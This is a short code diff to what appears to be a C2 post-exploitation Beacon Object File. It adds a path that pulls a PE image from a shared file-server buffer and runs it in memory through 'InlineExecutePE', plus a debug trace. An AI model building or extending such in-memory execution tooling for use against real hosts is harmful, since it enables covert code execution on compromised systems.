@@ -219,6 +219,7 @@ BOOL LoadHook(PVOID *hookBase, HookControlEntryProc *hookControlEntry) {
   memcpy(*hookBase, HOOKS, sizeof(HOOKS));
   C2SCInitialize(*hookBase, HOOKS_EXTRA);
   *hookControlEntry = (HookControlEntryProc)*hookBase;
+  TRACEF("Hooks code was loaded: %p", *hookBase);
 #endif
   return true;
 }
@@ -460,6 +461,30 @@ out:
 }
 
 #ifdef BOF
+BOOL GetPEImageFromFileServer(PVOID *peImage, int *peImageSize) {
+  // Get the file server from the global shared data
+  GlobalSharedData *data = GetGlobalSharedData();
+  FileServer *file = data->File;
+  if (!file) {
+    return FALSE;
+  }
+  data->File = NULL;
+
+  // Wait for the file server to complete
+  TRACEF("Wait for the file server to complete: %p", file);
+  WaitForSingleObject(file->CompletionEvent, INFINITE);
+  CloseHandle(file->CompletionEvent);
+
+  // Get the PE image from the file server
+  *peImage = file->Data;
+  *peImageSize = file->Size;
+  free(file);
+  TRACEF("PE image was fetched from the file server: %p (%d bytes)", *peImage,
+         *peImageSize);
+
+  return TRUE;
+}
+
 void go(char *argv, int argc) {
   // Parse arguments
   datap parser;
@@ -479,8 +504,17 @@ void go(char *argv, int argc) {
       features, force, stdin_, stdinSize, peImage, peImageSize, commandLineA,
       commandLineASize, jobVersion);
 
+  BOOL fromFileServer = FALSE;
+  if (!peImage || !peImageSize) {
+    fromFileServer = GetPEImageFromFileServer(&peImage, &peImageSize);
+  }
+
   InlineExecutePE(features, force, stdin_, stdinSize, peImage, peImageSize,
                   commandLineA, jobVersion, NULL, NULL);
+
+  if (fromFileServer) {
+    if (peImage) free(peImage);
+  }
 }
 #endif
 }
